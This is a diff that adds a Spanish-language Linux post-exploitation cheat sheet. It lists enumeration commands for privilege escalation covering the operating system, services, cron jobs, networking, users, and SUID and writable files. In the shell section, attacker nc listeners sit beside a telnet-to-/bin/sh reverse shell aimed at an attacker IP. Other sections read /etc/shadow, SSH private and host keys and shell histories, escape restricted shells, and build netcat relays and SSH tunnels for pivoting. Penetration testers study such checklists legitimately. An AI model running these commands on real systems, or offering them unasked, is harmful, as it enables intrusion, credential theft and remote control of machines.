@@ -1,0 +1,337 @@
+Sistema Operativo
+
+Qué distribución es? Qué versión?
+cat /etc/issue
+cat /etc/*-release
+cat /etc/lsb-release
+cat /etc/redhat-release
+lsb_release -a
+
+
+Cual es la versión del Kernel? Es de 64 Bits?
+cat /proc/version 
+uname -a
+uname -mrs
+rpm -q kernel
+dmesg | grep Linux
+ls /boot | grep vmlinuz-
+
+
+Qué se puede obtener de las variables de entorno?
+cat /etc/profile
+cat /etc/environment
+cat /etc/bashrc
+cat ~/.bash_profile
+cat ~/.bashrc
+cat ~/.bash_logout
+env
+set
+cat /proc/<pid>/environ
+printenv
+</pid>
+
+
+Alguna impresora?
+lpstat -a
+lpc status
+lpinfo
+
+
+
+Aplicaciones y Servicios
+
+Qué servicios están corriendo? Cual tiene privilegios de usuario?
+ps aux
+ps -ef
+top
+cat /etc/service
+service --status-all
+chkconfig --list
+
+
+Qué servicios corren como root? Cuales son vulnerables?
+?
+ps aux | grep root
+ps -ef | grep root
+
+
+Qué aplicaciones están instaladas? Qué versión tienen? Están ejecutándose?
+?
+ls -alh /usr/bin/
+ls -lah /sbin/
+dpkg -l
+rpm -qa
+ls -lah /var/cache/apt/archivesO
+ls -lah /var/cache/yum/
+
+
+Alguna mala configuración en estos servicios? Hay plugins vulnerables?
+?
+1
+cat /etc/syslog.conf
+cat /etc/chttp.conf
+cat /etc/lighttpd.conf
+cat /etc/cups/cupsd.conf
+cat /etc/inetd.conf
+cat /etc/apache2/apache2.conf
+cat /opt/lampp/etc/httpd.conf
+ls -aRl /etc/ | awk '$1 ~ /^.*r.*/
+
+
+Hay tareas programadas?
+?
+crontab -l
+ls -lah /var/spool/cron
+ls -al /etc/ | grep cron
+ls -al /etc/cron*
+cat /etc/cron*
+cat /etc/at.allow
+cat /etc/at.deny
+cat /etc/cron.allow
+cat /etc/cron.deny
+cat /etc/crontab
+cat /etc/anacrontab
+cat /var/spool/cron/crontabs/root
+
+
+Usuarios y/o contraseñas en texto claro?
+?
+grep -i user [filename]
+grep -i pass [filename]
+find . -name "*.php" -print0 | xargs -0 grep -i -n "var $password"   # Joomla
+
+
+
+Comunicaciones y Redes
+
+Quá adaptadores de red tiene el sistema? Conectado a otra red?
+?
+/sbin/ifconfig -a
+cat /etc/network/interfaces
+dmesg | grep 'Ethernet driver'
+
+
+Cuales son las configuraciones de red? DHCP? DNS? Gateway?
+cat /etc/resolv.conf
+cat /etc/sysconfig/network
+cat /etc/networks
+iptables -L
+hostname
+dnsdomainname
+route -n
+
+
+Qué otros usuarios y máquinas se comunican con el sistema?
+lsof -i
+lsof -i :80
+grep 80 /etc/services
+netstat -antup
+netstat -antpx
+netstat -tulpn
+chkconfig --list
+chkconfig --list | grep 3:on
+last
+w
+
+
+Que hay en caché? Direcciones IP y/o MAC
+arp -e
+route
+/sbin/route -nee
+
+
+Es posible la inspección de paquetes (sniffing)? Qué se puede observar? Escuchar tráfico en vivo
+# tcpdump tcp dst [ip] [port] and tcp dst [ip] [port]
+tcpdump tcp dst 192.168.1.7 80 and tcp dst 10.2.2.222 21
+
+
+Tenemos shell? Podemos interactuar con el sistema?
+# http://lanmaster53.com/2011/05/7-linux-shells-using-built-in-tools/
+nc -lvp 4444    # Attacker. Input (Commands)
+nc -lvp 4445    # Attacker. Ouput (Results)
+telnet [atackers ip] 44444 | /bin/sh | [local ip] 44445    # On the targets system. Use the attackers IP!
+
+
+Es posible el redireccionamiento de puertos? Redireccionar e interactuar con el tráfico desde otra vista
+# rinetd
+# http://www.howtoforge.com/port-forwarding-with-rinetd-on-debian-etch
+ 
+# fpipe
+# FPipe.exe -l [puerto local] -r [puerto remoto] -s [puerto local] [IP local]
+FPipe.exe -l 80 -r 80 -s 80 192.168.1.7
+ 
+# ssh -[L/R] [puerto local]:[IP remota]:[puerto remoto] [usuario local]@[IP local]
+ssh -L 8080:127.0.0.1:80 root@192.168.1.7    # Puerto Local
+ssh -R 8080:127.0.0.1:80 root@192.168.1.7    # Puerto Remoto
+ 
+# mknod backpipe p ; nc -l -p [puerto remoto] < backpipe  | nc [IP local] [puerto local] > backpipe
+mknod backpipe p ; nc -l -p 8080 < backpipe | nc 10.1.1.251 80 >backpipe    # Retransmisión de Puerto Port (Relay)
+mknod backpipe p ; nc -l -p 8080 0 & < backpipe | tee -a inflow | nc localhost 80 | tee -a outflow 1>backpipe    # Proxy (Puerto 80 a 8080)
+mknod backpipe p ; nc -l -p 8080 0 & < backpipe | tee -a inflow | nc localhost 80 | tee -a outflow & 1>backpipe    # Monitor de Proxy (Puerto 80 a 8080)
+
+
+Es posible hacer túnel? Enviar comandos localmente, remotamente
+ssh -D 127.0.0.1:9050 -N [username]@[ip]
+proxychains ifconfig
+
+
+
+Información Confidencial y Usuarios
+
+Quien eres? Quien está o ha estado logueado? Quien mas está ahi? Quien puede hacer que?
+?
+id
+who
+w
+last
+cat /etc/passwd | cut -d:    # Lista de usuarios
+grep -v -E "^#" /etc/passwd | awk -F: '$3 == 0 { print $1}'   # Lista de super-usuarios
+awk -F: '($3 == "0") {print}' /etc/passwd   # Lista de super usuarios
+cat /etc/sudoers
+sudo -l
+
+
+Qué archivos sensibles podemos encontrar?
+cat /etc/passwd
+cat /etc/group
+cat /etc/shadow
+ls -lah /var/mail/
+
+
+Algo "interesante" en los directorios /home? Es posible acceder a estos?
+ls -ahlR /root/
+ls -ahlR /home/
+
+
+Hay contraseñas, scripts, bases de datos, archivos de configuración o de logs? Rutas por defecto y ubicaciones de contraseñas
+cat /var/lib/mysql/mysql/user.MYD
+cat /root/anaconda-ks.cfg
+
+
+Que ha estado haciendo el usuario? Hay alguna contraseña en texto claro? Que ha estado editando?
+cat ~/.bash_history
+cat ~/.nano_history
+cat ~/.atftp_history
+cat ~/.mysql_history
+
+
+Qué información del usuario podemos encontrar?
+cat ~/.bashrc
+cat ~/.profile
+cat /var/mail/root
+cat /var/spool/mail/root
+
+
+Podemos encontrar información de llave privada?
+cat ~/.ssh/authorized_keys
+cat ~/.ssh/identity.pub
+cat ~/.ssh/identity
+cat ~/.ssh/id_rsa.pub
+cat ~/.ssh/id_rsa
+cat ~/.ssh/id_dsa.pub
+cat ~/.ssh/id_dsa
+cat /etc/ssh/ssh_config
+cat /etc/ssh/sshd_config
+cat /etc/ssh/ssh_host_dsa_key.pub
+cat /etc/ssh/ssh_host_dsa_key
+cat /etc/ssh/ssh_host_rsa_key.pub
+cat /etc/ssh/ssh_host_rsa_key
+cat /etc/ssh/ssh_host_key.pub
+cat /etc/ssh/ssh_host_key
+
+
+Sistemas de Archivos
+
+Qué podemos modificar en /etc/? Podemos reconfigurar un servicio?
+ls -aRl /etc/ | awk '$1 ~ /^.*w.*/' 2>/dev/null     # Todos
+ls -aRl /etc/ | awk '$1 ~ /^..w/' 2>/dev/null       # Propietario
+ls -aRl /etc/ | awk '$1 ~ /^.....w/' 2>/dev/null    # Grupo
+ls -aRl /etc/ | awk '$1 ~ /w.$/' 2>/dev/null        # Otros
+ 
+find /etc/ -readable -type f 2>/dev/null               # Todos
+find /etc/ -readable -type f -maxdepth 1 2>/dev/null   # Todos
+
+
+Qué podemos encontrar en /var/ ?
+ls -lah /var/log
+ls -lah /var/mail
+ls -lah /var/spool
+ls -lah /var/spool/lpd
+ls -lah /var/lib/pgsql
+ls -lah /var/lib/mysql
+cat /var/lib/dhcp3/dhclient.leases
+
+
+Alguna configuración/archivo oculto en el sitio web? Algún archivo de configuración con información de bases de datos?
+ls -lahR /var/www/
+ls -lahR /srv/www/htdocs/
+ls -lahR /usr/local/www/apache22/data/
+ls -lahR /opt/lampp/htdocs/
+ls -lahR /var/www/html/
+
+
+Algo en los archivos de logs? (Podría ayudar con "Local File Includes"!)
+cat /var/log/messages
+cat /var/log/secure
+cat /var/webmin/miniserv.log
+cat /var/log/cups/error_log
+cat /var/log/chttp.log
+cat /var/log/lighttpd/access.log
+cat /var/log/lighttpd/error.log
+
+
+Si los comandos son limitados, podremos saltarnos la "jaula" de la shell?
+python -c 'import pty;pty.spawn("/bin/bash")'
+echo os.system('/bin/bash')
+/bin/sh -i
+
+
+Como están montados los sistemas de archivos?
+mount
+df -h
+
+
+Hay algún sistema de archivos sin montar?
+cat /etc/fstab
+
+
+Que "Permisos Avanzados de Archivos Linux" son utilizados? Sticky bits, SUID & GUID
+find / -perm -1000 -type d 2>/dev/null   # Sticky bit - Solo el dueño del directorio o del archivo puede renombrar o borrar aqui
+find / -perm -g=s -type f 2>/dev/null    # SGID (chmod 2000) - ejecución como grupo, no como el usuario que lo inició.
+find / -perm -u=s -type f 2>/dev/null    # SUID (chmod 4000) - ejecución como dueño, no como usuario que lo inició.
+find / -perm -g=s -o -perm -u=s -type f 2>/dev/null    # SGID ó SUID
+for i in `locate -r "bin$"`; do find $i \( -perm -4000 -o -perm -2000 \) -type f 2>/dev/null; done    # Busca SGID ó SUID en lugares "comunes": /bin, /sbin, /usr/bin, /usr/sbin, /usr/local/bin, /usr/local/sbin y en cualquier otro *bin,  (Búsqueda más rápida)
+ 
+# Buscar iniciando en la raíz (/), SGID ó SUID, no enlaces simbólicos, solo 3 niveles de profundidad, lista con más detalles y oculta errores de acceso (permission denied).
+find / -perm -g=s -o -perm -4000 ! -type l -maxdepth 3 -exec ls -ld {} \; 2>/dev/null
+
+
+En donde se puede escribir y desde donde se puede ejecutar? Unos cuantos lugares "comunes": /tmp, /var/tmp, /dev/shm
+find / -writable -type d 2>/dev/null     # directorios con escritura para todos
+find / -perm -222 -type d 2>/dev/null    # directorios con escritura para todos
+find / -perm -o+w -type d 2>/dev/null    # directorios con escritura para todos
+find / -perm -o+x -type d 2>/dev/null    # directorios con ejecución para todos
+find / \( -perm -o+w -perm -o+x \) -type d 2>/dev/null   # ejecución & escritura
+
+
+Hay algún archivo "problema"? Archivos con usuario "nobody"?
+find / -xdev -type d \( -perm -0002 -a ! -perm -1000 \) -print   # Archivos con escritura para todos
+find /dir -xdev \( -nouser -o -nogroup \) -print   # Archivos sin dueño
+
+
+
+Búsqueda & Preparación de Códigos para Exploits
+
+Qué herramientas/lenguajes de desarrollo están soportadas/instaladas?
+find / -name perl*
+find / -name python*
+find / -name gcc*
+find / -name cc
+
+
+Cómo se pueden cargar los archivos?
+find / -name wget
+find / -name nc*
+find / -name netcat*
+find / -name tftp*
+find / -name ftp
